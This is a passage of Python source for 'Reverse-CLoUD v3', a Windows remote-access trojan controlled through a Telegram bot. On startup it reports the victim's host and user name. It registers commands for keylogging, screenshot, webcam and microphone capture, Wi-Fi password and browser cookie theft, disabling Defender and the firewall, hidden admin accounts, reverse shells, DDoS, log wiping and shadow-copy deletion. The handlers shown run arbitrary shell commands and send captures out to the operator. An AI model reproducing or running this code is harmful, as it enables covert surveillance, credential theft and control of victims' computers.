        except Exception:
            return "❌ Search failed"

    def list_dir(self, path="."):
        try:
            files = os.listdir(path)
            return "🔹 Directory Listing:\n" + "\n".join(files[:50])
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def copy(self, src, dst):
        try:
            shutil.copy2(src, dst)
            return f"✅ Copied: {src} -> {dst}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def move(self, src, dst):
        try:
            shutil.move(src, dst)
            return f"✅ Moved: {src} -> {dst}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def rename(self, old_path, new_name):
        try:
            new_path = os.path.join(os.path.dirname(old_path), new_name)
            os.rename(old_path, new_path)
            return f"✅ Renamed to: {new_name}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            return f"✅ Directory created: {path}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def zip(self, folder_path, output_zip):
        try:
            with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), folder_path))
            return f"✅ Zipped: {output_zip}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def unzip(self, zip_path, extract_path):
        try:
            with zipfile.ZipFile(zip_path, 'r') as zipf:
                zipf.extractall(extract_path)
            return f"✅ Extracted to: {extract_path}"
        except Exception as e:
            return f"❌ Error: {str(e)}"



class PhantomCore:
    def __init__(self):
        CONSOLE.start("Initializing Reverse-CLoUD v3")

        CONSOLE.info("Starting Stealth Engine")
        self.stealth = StealthEngine()

        CONSOLE.info("Starting Unkillable Guard")
        self.guard = UnkillableGuard()

        CONSOLE.info("Starting Spyware Engine")
        self.spyware = SpywareEngine()

        CONSOLE.info("Starting Network Engine")
        self.network = NetworkEngine()

        CONSOLE.info("Starting Persistent PowerShell")
        self.ps_shell = PersistentPowerShell()

        CONSOLE.info("Starting Persistent CMD")
        self.cmd_shell = PersistentCMD()

        CONSOLE.info("Starting Privesc Engine")
        self.privesc = PrivescEngine()

        CONSOLE.info("Starting File Ops Engine")
        self.fileops = FileOpsEngine()

        self.running = True
        self.start_time = datetime.now()
        self.cmd_count = 0
        self.commands = {}
        self.pending_upload = None
        self.register_commands()

        CONSOLE.info("Sending startup notification")
        bot.send_message_async(
            "💀 Reverse-CLoUD v3 Connected\n"
            f"Host: {platform.node()}\n"
            f"User: {os.environ.get('USERNAME', 'unknown')}\n"
            f"Commands: {len(self.commands)}+ merged\n"
            f"Persistent PS: ✅\n"
            f"Persistent CMD: ✅\n"
            f"Type /help"
        )

        CONSOLE.done("Initialization complete")
        CONSOLE.finish()

    def get_startup_info(self):
        try:
            import psutil
            return f"""
🔹 System: {platform.system()} {platform.release()}
🔹 Host: {platform.node()}
🔹 CPU: {psutil.cpu_percent()}%
🔹 RAM: {psutil.virtual_memory().percent}%
🔹 Commands: {len(self.commands)}+
🔹 Persistence: 30 SAFE methods
🔹 Python: UNTOUCHED
🔹 PS Shell: Persistent
🔹 CMD Shell: Persistent
🔹 Instance: {INSTANCE_ID}
"""
        except Exception:
            return "Reverse-CLoUD v3 Started"

    def register_commands(self):
        CONSOLE.start("Registering commands...")

        self.commands["ps1"] = self.cmd_ps1
        self.commands["ps"] = self.cmd_ps
        self.commands["cmd1"] = self.cmd_cmd1
        self.commands["cmd"] = self.cmd_cmd1
        self.commands["pwd"] = self.cmd_pwd
        self.commands["cwd"] = self.cmd_cwd
        self.commands["help"] = self.cmd_help
        self.commands["sysinfo"] = self.cmd_sysinfo
        self.commands["hwinfo"] = self.cmd_hwinfo
        self.commands["swinfo"] = self.cmd_swinfo
        self.commands["processes"] = self.cmd_processes
        self.commands["services"] = self.cmd_services
        self.commands["drivers"] = self.cmd_drivers
        self.commands["netinfo"] = self.cmd_netinfo
        self.commands["netstats"] = self.cmd_netstats
        self.commands["users"] = self.cmd_users
        self.commands["drives"] = self.cmd_drives
        self.commands["openports"] = self.cmd_openports
        self.commands["firewallrules"] = self.cmd_firewallrules
        self.commands["scheduledtasks"] = self.cmd_scheduledtasks
        self.commands["environment"] = self.cmd_environment
        self.commands["hostsfile"] = self.cmd_hostsfile
        self.commands["dnscache"] = self.cmd_dnscache
        self.commands["arptable"] = self.cmd_arptable
        self.commands["windowsversion"] = self.cmd_windowsversion
        self.commands["installedapps"] = self.cmd_installedapps
        self.commands["startupprograms"] = self.cmd_startupprograms
        self.commands["recentfiles"] = self.cmd_recentfiles
        self.commands["cmdhistory"] = self.cmd_cmdhistory
        self.commands["powershellhistory"] = self.cmd_powershellhistory
        self.commands["batteryinfo"] = self.cmd_batteryinfo
        self.commands["sounddevices"] = self.cmd_sounddevices
        self.commands["usbdevices"] = self.cmd_usbdevices
        self.commands["stats"] = self.cmd_stats
        self.commands["keylogstart"] = self.cmd_keylogstart
        self.commands["keylogstop"] = self.cmd_keylogstop
        self.commands["keylogget"] = self.cmd_keylogget
        self.commands["screenshot"] = self.cmd_screenshot
        self.commands["screenshotactive"] = self.cmd_screenshotactive
        self.commands["webcam"] = self.cmd_webcam
        self.commands["mic"] = self.cmd_mic
        self.commands["wifipasswords"] = self.cmd_wifipasswords
        self.commands["browsercookies"] = self.cmd_browsercookies
        self.commands["clipboard"] = self.cmd_clipboard
        self.commands["location"] = self.cmd_location
        self.commands["bluetoothscan"] = self.cmd_bluetoothscan
        self.commands["run"] = self.cmd_run
        self.commands["runbg"] = self.cmd_runbg
        self.commands["execute"] = self.cmd_execute
        self.commands["kill"] = self.cmd_kill
        self.commands["killall"] = self.cmd_killall
        self.commands["suspend"] = self.cmd_suspend
        self.commands["resume"] = self.cmd_resume
        self.commands["priority"] = self.cmd_priority
        self.commands["restart"] = self.cmd_restart
        self.commands["shutdown"] = self.cmd_shutdown
        self.commands["logout"] = self.cmd_logout
        self.commands["lock"] = self.cmd_lock
        self.commands["wallpaper"] = self.cmd_wallpaper
        self.commands["settime"] = self.cmd_settime
        self.commands["renamepc"] = self.cmd_renamepc
        self.commands["adduser"] = self.cmd_adduser
        self.commands["deluser"] = self.cmd_deluser
        self.commands["changepassword"] = self.cmd_changepassword
        self.commands["hidefile"] = self.cmd_hidefile
        self.commands["unhidefile"] = self.cmd_unhidefile
        self.commands["tree"] = self.cmd_tree
        self.commands["bootmanager"] = self.cmd_bootmanager
        self.commands["drivermanager"] = self.cmd_drivermanager
        self.commands["powerscheme"] = self.cmd_powerscheme
        self.commands["volume"] = self.cmd_volume
        self.commands["brightness"] = self.cmd_brightness
        self.commands["screenrotate"] = self.cmd_screenrotate
        self.commands["taskbarhide"] = self.cmd_taskbarhide
        self.commands["desktopicons"] = self.cmd_desktopicons
        self.commands["systeminfogui"] = self.cmd_systeminfogui
        self.commands["networkgui"] = self.cmd_networkgui
        self.commands["processgui"] = self.cmd_processgui
        self.commands["filegui"] = self.cmd_filegui
        self.commands["cmdgui"] = self.cmd_cmdgui
        self.commands["reggui"] = self.cmd_reggui
        self.commands["eventgui"] = self.cmd_eventgui
        self.commands["servicegui"] = self.cmd_servicegui
        self.commands["upload"] = self.cmd_upload
        self.commands["download"] = self.cmd_download
        self.commands["downloadurl"] = self.cmd_downloadurl
        self.commands["delete"] = self.cmd_delete
        self.commands["find"] = self.cmd_find
        self.commands["ls"] = self.cmd_ls
        self.commands["copy"] = self.cmd_copy
        self.commands["move"] = self.cmd_move
        self.commands["rename"] = self.cmd_rename
        self.commands["mkdir"] = self.cmd_mkdir
        self.commands["zip"] = self.cmd_zip
        self.commands["unzip"] = self.cmd_unzip
        self.commands["fileproperties"] = self.cmd_fileproperties
        self.commands["filehash"] = self.cmd_filehash
        self.commands["uac"] = self.cmd_uac
        self.commands["uacadvanced"] = self.cmd_uacadvanced
        self.commands["system"] = self.cmd_system
        self.commands["disabledefender"] = self.cmd_disabledefender
        self.commands["disablefirewall"] = self.cmd_disablefirewall
        self.commands["addadmin"] = self.cmd_addadmin
        self.commands["hiddenuser"] = self.cmd_hiddenuser
        self.commands["scanports"] = self.cmd_scanports
        self.commands["scannetwork"] = self.cmd_scannetwork
        self.commands["ddos"] = self.cmd_ddos
        self.commands["checkinternet"] = self.cmd_checkinternet
        self.commands["wifiscan"] = self.cmd_wifiscan
        self.commands["dnschange"] = self.cmd_dnschange
        self.commands["proxy"] = self.cmd_proxy
        self.commands["reverseshell"] = self.cmd_reverseshell
        self.commands["bindshell"] = self.cmd_bindshell
        self.commands["netstat"] = self.cmd_netstat
        self.commands["ping"] = self.cmd_ping
        self.commands["whois"] = self.cmd_whois
        self.commands["persist"] = self.cmd_persist
        self.commands["persistcheck"] = self.cmd_persistcheck
        self.commands["unpersist"] = self.cmd_unpersist
        self.commands["wipetraces"] = self.cmd_wipetraces
        self.commands["clearlogs"] = self.cmd_clearlogs
        self.commands["deleteshadows"] = self.cmd_deleteshadows
        self.commands["suicide"] = self.cmd_suicide

        CONSOLE.done(f"{len(self.commands)} commands registered")

    

    def cmd_help(self, args, msg):
        return f"""
💀 Reverse-CLoUD v3 - Merged Edition 💀
Author: Lxx CLoUD - @lxxcloud

⚡ PERSISTENT SHELLS :
/ps1 <cmd> - Persistent PowerShell
/ps1 cd Desktop - Change dir (persists!)
/ps1 ls - List files
/ps1 dir - List files
/pwd - Show PowerShell current dir
/cmd1 <cmd> - Persistent CMD
/cmd1 cd C:\\Users - Change dir (persists!)
/cmd1 dir - List files
/cwd - Show CMD current dir
/ps <cmd> - Simple PowerShell (no persistence)
/run <cmd> - Simple CMD

📤 UPLOAD FILES :
/upload - Just type this then send file!
/upload C:\\path\\to\\save - Save to specific path

📥 DOWNLOAD FILES:
/download C:\\path\\file.txt - Send file to Telegram

📊 System :
/sysinfo /hwinfo /swinfo /processes /services /drivers
/netinfo /netstats /users /drives /openports /firewallrules
/scheduledtasks /environment /hostsfile /dnscache /arptable
/windowsversion /installedapps /startupprograms /recentfiles
/cmdhistory /powershellhistory /batteryinfo /sounddevices
/usbdevices /stats

👁️ Spyware :
/keylogstart /keylogstop /keylogget /screenshot
/screenshotactive /webcam 
/mic 3 /mic 10 /mic 20 
 /wifipasswords /browsercookies /clipboard /location /bluetoothscan

🎮 System Control :
/run /runbg /execute /kill /killall /suspend /resume
/priority /restart /shutdown /logout /lock /wallpaper
/settime /renamepc /adduser /deluser /changepassword
/hidefile /unhidefile /tree /bootmanager /drivermanager
/powerscheme /volume /brightness /screenrotate /taskbarhide
/desktopicons /systeminfogui /networkgui /processgui
/filegui /cmdgui /reggui /eventgui /servicegui

📁 Files :
/upload /download /downloadurl /delete /find /ls
/copy /move /rename /mkdir /zip /unzip
/fileproperties /filehash

🔓 Privilege :
/uac /uacadvanced /system /disabledefender /disablefirewall
/addadmin /hiddenuser

🌐 Network :
/scanports /scannetwork /ddos /checkinternet /wifiscan /dnschange
/proxy /reverseshell /bindshell /netstat /ping /whois

🛡️ Persistence :
/persist /persistcheck /unpersist /wipetraces

💥 Destruction :
/clearlogs /deleteshadows /suicide


🛡️ PYTHON-SAFE
All files in: {SAFE_DIR}

dev : @lxxcloud
"""

    
    def cmd_ps1(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /ps1 <powershell_command>\nExample: /ps1 cd Desktop\nExample: /ps1 ls"

        try:
            result = self.ps_shell.execute(args, timeout=60)

            if isinstance(result, tuple):
                output, cwd = result
            else:
                output, cwd = result, ""

            parts = []
            if output:
                if len(output) > 3500:
                    output = output[:3490] + "\n...(truncated)"
                parts.append(f"```\n{output}\n```")
            else:
                parts.append("✅ Executed (no output)")

            if cwd:
                parts.append(f"📁 `{cwd}`")

            return "\n".join(parts)

        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_ps(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /ps <powershell_command>"
        try:
            output = subprocess.check_output(f"powershell -Command \"{args}\"", shell=True, text=True, timeout=30, stderr=subprocess.STDOUT)
            return f"```\n{output[:4000]}\n```" if output.strip() else "✅ Executed (no output)"
        except subprocess.TimeoutExpired:
            return "❌ Timeout"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_cmd1(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /cmd1 <command>\nExample: /cmd1 cd Desktop\nExample: /cmd1 dir"

        try:
            result = self.cmd_shell.execute(args, timeout=60)

            if isinstance(result, tuple):
                output, cwd = result
            else:
                output, cwd = result, ""

            parts = []
            if output:
                if len(output) > 3500:
                    output = output[:3490] + "\n...(truncated)"
                parts.append(f"```\n{output}\n```")
            else:
                parts.append("✅ Executed (no output)")

            if cwd:
                parts.append(f"📁 `{cwd}`")

            return "\n".join(parts)

        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_pwd(self, args, msg):
        self.cmd_count += 1
        try:
            result = self.ps_shell.execute("pwd", timeout=10)
            if isinstance(result, tuple):
                output, cwd = result
                if cwd:
                    return f"📁 PowerShell CWD: `{cwd}`"
                return f"📁 `{output}`" if output else "❌ Could not get current directory"
            return f"📁 `{result}`"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_cwd(self, args, msg):
        self.cmd_count += 1
        try:
            result = self.cmd_shell.execute("cd", timeout=10)
            if isinstance(result, tuple):
                output, cwd = result
                if cwd:
                    return f"📁 CMD CWD: `{cwd}`"
                return f"📁 `{output}`" if output else "❌ Could not get current directory"
            return f"📁 `{result}`"
        except Exception as e:
            return f"❌ Error: {str(e)}"

   
    def cmd_sysinfo(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            return f"""
🔹 System Information
- OS: {platform.system()} {platform.release()}
- Hostname: {platform.node()}
- CPU: {platform.processor()} ({psutil.cpu_count()} cores)
- RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
- Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB
- Boot: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
- Python: UNTOUCHED
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_hwinfo(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            return f"🔹 Hardware\n- CPU: {platform.processor()}\n- Cores: {psutil.cpu_count()}\n- RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_swinfo(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("wmic product get name,version 2>nul", shell=True, text=True, timeout=5)
            lines = result.split('\n')[1:-1]
            return "🔹 Installed Software\n" + "\n".join(lines[:20])
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_processes(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            procs = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append(f"{proc.info['pid']}: {proc.info['name']} (CPU: {proc.info['cpu_percent']}%, MEM: {proc.info['memory_percent']:.2f}%)")
                except Exception:
                    continue
            return "🔹 Processes\n" + "\n".join(procs[:50])
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_services(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("sc query state= all 2>nul", shell=True, text=True, timeout=5)
            lines = [line.strip() for line in result.split('\n') if "SERVICE_NAME" in line]
            return "🔹 Services\n" + "\n".join(lines[:30])
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_drivers(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("driverquery /v 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 Drivers\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_netinfo(self, args, msg):
        self.cmd_count += 1
        try:
            return f"""
🔹 Network Information
- Hostname: {socket.gethostname()}
- IP: {socket.gethostbyname(socket.gethostname())}
- MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])}
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_netstats(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            stats = psutil.net_io_counters()
            return f"""
🔹 Network Stats
- Sent: {round(stats.bytes_sent / (1024**2), 2)} MB
- Received: {round(stats.bytes_recv / (1024**2), 2)} MB
- Connections: {len(psutil.net_connections())}
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_users(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            users = [f"{user.name} (Session: {user.terminal})" for user in psutil.users()]
            return "🔹 Users\n" + "\n".join(users) if users else "❌ No users found"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_drives(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            drives = []
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    drives.append(f"{part.device} - {round(usage.free / (1024**3), 2)} GB free")
                except Exception:
                    continue
            return "🔹 Drives\n" + "\n".join(drives)
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_openports(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            connections = psutil.net_connections('inet')
            ports = [f"{conn.laddr.ip}:{conn.laddr.port}" for conn in connections if conn.status == 'ESTABLISHED']
            return "🔹 Open Ports\n" + "\n".join(ports[:30]) if ports else "❌ No connections"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_firewallrules(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("netsh advfirewall firewall show rule name=all 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 Firewall Rules\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_scheduledtasks(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("schtasks /query /fo LIST 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 Scheduled Tasks\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_environment(self, args, msg):
        self.cmd_count += 1
        try:
            envs = "\n".join([f"{k}: {v}" for k, v in os.environ.items()])
            return f"🔹 Environment\n```\n{envs[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_hostsfile(self, args, msg):
        self.cmd_count += 1
        try:
            hosts_path = "C:\\Windows\\System32\\drivers\\etc\\hosts"
            with open(hosts_path, "r") as f:
                return f"🔹 Hosts File\n```\n{f.read()[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_dnscache(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("ipconfig /displaydns 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 DNS Cache\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_arptable(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("arp -a 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 ARP Table\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_windowsversion(self, args, msg):
        self.cmd_count += 1
        try:
            return f"🔹 Windows Version\n{platform.version()}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_installedapps(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("wmic product get name,version 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 Installed Apps\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_startupprograms(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("wmic startup get command 2>nul", shell=True, text=True, timeout=5)
            return f"🔹 Startup Programs\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_recentfiles(self, args, msg):
        self.cmd_count += 1
        try:
            recent = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
            files = os.listdir(recent)[:30]
            return "🔹 Recent Files\n" + "\n".join(files)
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_cmdhistory(self, args, msg):
        self.cmd_count += 1
        try:
            history_file = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
            if os.path.exists(history_file):
                with open(history_file, "r", encoding="utf-8") as f:
                    return f"🔹 CMD History\n```\n{f.read()[:4000]}\n```"
            return "❌ No history found"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_powershellhistory(self, args, msg):
        self.cmd_count += 1
        try:
            history_file = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
            if os.path.exists(history_file):
                with open(history_file, "r", encoding="utf-8") as f:
                    return f"🔹 PowerShell History\n```\n{f.read()[:4000]}\n```"
            return "❌ No history found"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_batteryinfo(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            battery = psutil.sensors_battery()
            if battery:
                return f"🔹 Battery\n- Percent: {battery.percent}%\n- Plugged: {battery.power_plugged}\n- Time left: {battery.secsleft}s"
            return "❌ No battery found"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_sounddevices(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("wmic sounddev get name 2>nul", shell=True, text=True)
            return f"🔹 Sound Devices\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_usbdevices(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR 2>nul", shell=True, text=True)
            return f"🔹 USB Devices\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_stats(self, args, msg):
        self.cmd_count += 1
        try:
            import psutil
            uptime = datetime.now() - self.start_time
            mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024**2
            return f"""
📊 Stats
- Uptime: {str(uptime).split('.')[0]}
- Commands: {self.cmd_count}
- Memory: {round(mem_usage, 2)} MB
- Active Tasks: {len(self.spyware.active_tasks)}
- Pending Upload: {self.pending_upload or 'None'}
- Python: UNTOUCHED
- PS Shell: {'✅ Running' if self.ps_shell.proc and self.ps_shell.proc.poll() is None else '❌ Dead'}
- CMD Shell: {'✅ Running' if self.cmd_shell.proc and self.cmd_shell.proc.poll() is None else '❌ Dead'}
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_keylogstart(self, args, msg):
        self.cmd_count += 1
        return self.spyware.keylog_start()

    def cmd_keylogstop(self, args, msg):
        self.cmd_count += 1
        return self.spyware.keylog_stop()

    def cmd_keylogget(self, args, msg):
        self.cmd_count += 1
        return self.spyware.keylog_get()

    def cmd_screenshot(self, args, msg):
        self.cmd_count += 1
        result = self.spyware.screenshot()
        if result and os.path.exists(result):
            bot.send_file(result, "📸 Screenshot")
            try:
                os.remove(result)
            except Exception:
                pass
            return "✅ Screenshot sent"
        return "❌ Screenshot failed"

    def cmd_screenshotactive(self, args, msg):
        self.cmd_count += 1
        result = self.spyware.screenshot_active()
        if result and os.path.exists(result):
            bot.send_file(result, "📸 Active Window")
            try:
                os.remove(result)
            except Exception:
                pass
            return "✅ Sent"
        return "❌ Failed"

    def cmd_webcam(self, args, msg):
        self.cmd_count += 1
        result = self.spyware.webcam()
        if result and os.path.exists(result):
            bot.send_file(result, "📸 Webcam")
            try:
                os.remove(result)
            except Exception:
                pass
            return "✅ Webcam sent"
        return "❌ Webcam failed"

    def cmd_mic(self, args, msg):
        self.cmd_count += 1
        duration = int(args) if args and args.isdigit() else 10
        result = self.spyware.mic(duration)
        if result and os.path.exists(result):
            bot.send_file(result, f"🎤 Mic ({duration}s)")
            try:
                os.remove(result)
            except Exception:
                pass
            return "✅ Audio sent"
        return "❌ Recording failed"

    def cmd_wifipasswords(self, args, msg):
        self.cmd_count += 1
        return self.spyware.wifi_passwords()

    def cmd_browsercookies(self, args, msg):
        self.cmd_count += 1
        return self.spyware.browser_cookies()

    def cmd_clipboard(self, args, msg):
        self.cmd_count += 1
        return self.spyware.clipboard()

    def cmd_location(self, args, msg):
        self.cmd_count += 1
        return self.spyware.location()

    def cmd_bluetoothscan(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("pnputil /enum-devices /connected 2>nul", shell=True, text=True)
            return f"🔹 Bluetooth\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_run(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /run <command>"
        try:
            output = subprocess.check_output(args, shell=True, text=True, timeout=30, stderr=subprocess.STDOUT)
            return f"```\n{output[:4000]}\n```" if output.strip() else "✅ Executed (no output)"
        except subprocess.TimeoutExpired:
            return "❌ Timeout"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_runbg(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /runbg <command>"
        try:
            subprocess.Popen(args, shell=True, creationflags=0x08000000)
            return f"✅ Background: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_execute(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /execute <file_path>"
        try:
            subprocess.Popen(args, shell=True)
            return f"✅ Executed: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_kill(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /kill <pid>"
        try:
            import psutil
            psutil.Process(int(args)).kill()
            return f"✅ Killed PID {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_killall(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /killall <name>"
        try:
            import psutil
            killed = 0
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == args.lower():
                    try:
                        proc.kill()
                        killed += 1
                    except Exception:
                        continue
            return f"✅ Killed {killed} instances"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_suspend(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /suspend <pid>"
        try:
            import psutil
            psutil.Process(int(args)).suspend()
            return f"✅ Suspended {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_resume(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /resume <pid>"
        try:
            import psutil
            psutil.Process(int(args)).resume()
            return f"✅ Resumed {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_priority(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /priority <pid> <priority>"
        try:
            import psutil
            proc = psutil.Process(int(parts[0]))
            pmap = {"idle": psutil.IDLE_PRIORITY_CLASS, "low": psutil.BELOW_NORMAL_PRIORITY_CLASS,
                    "normal": psutil.NORMAL_PRIORITY_CLASS, "high": psutil.ABOVE_NORMAL_PRIORITY_CLASS,
                    "realtime": psutil.REALTIME_PRIORITY_CLASS}
            proc.nice(pmap.get(parts[1].lower(), psutil.NORMAL_PRIORITY_CLASS))
            return f"✅ Priority set for {parts[0]}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_restart(self, args, msg):
        self.cmd_count += 1
        os.system("shutdown /r /t 30")
        return "✅ Restart in 30s"

    def cmd_shutdown(self, args, msg):
        self.cmd_count += 1
        os.system("shutdown /s /t 30")
        return "✅ Shutdown in 30s"

    def cmd_logout(self, args, msg):
        self.cmd_count += 1
        os.system("shutdown /l")
        return "✅ Logging out..."

    def cmd_lock(self, args, msg):
        self.cmd_count += 1
        try:
            ctypes.windll.user32.LockWorkStation()
            return "✅ Locked"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_wallpaper(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /wallpaper <image_path>"
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, args, 3)
            return f"✅ Wallpaper set"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_settime(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /settime <YYYY-MM-DD HH:MM:SS>"
        try:
            os.system(f'date {args[:10]} && time {args[11:]}')
            return f"✅ Time set to {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_renamepc(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /renamepc <name>"
        try:
            ctypes.windll.kernel32.SetComputerNameExW(1, args)
            return f"✅ PC renamed to {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_adduser(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /adduser <username> <password>"
        try:
            os.system(f'net user {parts[0]} {parts[1]} /add 2>nul')
            return f"✅ User {parts[0]} added"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_deluser(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /deluser <username>"
        try:
            os.system(f'net user {args} /delete 2>nul')
            return f"✅ User {args} deleted"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_changepassword(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /changepassword <username> <password>"
        try:
            os.system(f'net user {parts[0]} {parts[1]} 2>nul')
            return f"✅ Password changed for {parts[0]}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_hidefile(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /hidefile <path>"
        try:
            os.system(f'attrib +h +s "{args}" 2>nul')
            return f"✅ Hidden: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_unhidefile(self, args, msg):
        self.cmd_count += 1
        if not args:
